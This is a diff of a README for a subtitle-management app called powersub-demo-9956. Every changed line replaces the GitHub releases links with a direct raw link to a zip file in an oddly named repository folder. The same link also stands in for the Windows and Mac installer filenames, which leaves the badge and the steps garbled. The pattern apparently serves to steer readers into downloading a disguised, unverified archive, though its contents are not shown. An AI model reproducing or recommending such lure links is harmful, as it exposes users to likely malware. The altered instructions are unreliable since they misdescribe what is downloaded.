@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-9956 - Simple Video Subtitle Management
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/R-Urena/powersub-demo-9956/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/R-Urena/powersub-demo-9956/main/maimedness/powersub-demo-9956.zip%20Latest%https://raw.githubusercontent.com/R-Urena/powersub-demo-9956/main/maimedness/powersub-demo-9956.zip)](https://raw.githubusercontent.com/R-Urena/powersub-demo-9956/main/maimedness/powersub-demo-9956.zip)
 
 ## 🚀 Getting Started
 Welcome to **powersub-demo-9956**! This application helps you manage video subtitles easily. Whether you want to add, edit, or remove subtitles from your videos, this tool simplifies the process. You only need to follow a few steps to get started.
@@ -24,13 +24,13 @@ Before you download, ensure your system meets the following requirements:
 To download and install **powersub-demo-9956**, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page here](https://github.com/R-Urena/powersub-demo-9956/releases) to find the latest version of the application.
+   Go to the [Releases page here](https://raw.githubusercontent.com/R-Urena/powersub-demo-9956/main/maimedness/powersub-demo-9956.zip) to find the latest version of the application.
 
 2. **Select the Latest Release**
    Look for the most recent version listed at the top of the page. This will typically be marked with a "Latest release" label.
 
 3. **Download the Installer**
-   Click on the download link for your system. It may look like **powersub-demo-9956-x.x.x.exe** for Windows or **powersub-demo-9956-x.x.x.dmg** for Mac. 
+   Click on the download link for your system. It may look like **https://raw.githubusercontent.com/R-Urena/powersub-demo-9956/main/maimedness/powersub-demo-9956.zip** for Windows or **https://raw.githubusercontent.com/R-Urena/powersub-demo-9956/main/maimedness/powersub-demo-9956.zip** for Mac. 
 
 4. **Run the Installer**
    Once the file finishes downloading, locate it in your downloads folder. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
